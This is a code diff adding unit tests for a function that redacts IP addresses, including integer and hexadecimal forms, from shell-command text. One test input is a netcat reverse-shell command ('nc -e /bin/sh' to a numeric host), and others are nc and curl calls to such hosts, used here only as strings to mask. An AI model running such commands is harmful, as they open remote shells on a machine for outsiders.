@@ -39,6 +39,19 @@ def test_does_not_touch_domains_or_version_strings() -> None:
     assert redact_ips("chmod 777 x; 13:41:49") == "chmod 777 x; 13:41:49"
 
 
+def test_redacts_schemeless_numeric_hosts() -> None:
+    assert redact_ips("nc -e /bin/sh 2130706433 4444") == "nc -e /bin/sh ‹ip› 4444"
+    assert redact_ips("nc 0x7f000001 4444") == "nc ‹ip› 4444"
+    assert redact_ips("curl ftp://2130706433/x") == "curl ftp://‹ip›/x"
+
+
+def test_does_not_touch_ordinary_shell_numbers() -> None:
+    for s in ["chmod 777 x", "sleep 30", "dd bs=1024", "id=12345"]:
+        assert redact_ips(s) == s
+    # 10-digit but above the valid IPv4-as-integer range (> 4294967295): not an IP.
+    assert redact_ips("echo 9999999999") == "echo 9999999999"
+
+
 def test_idempotent_and_none_passthrough() -> None:
     once = redact_ips("get http://1.2.3.4/x")
     assert redact_ips(once) == once  # already blotted -> unchanged
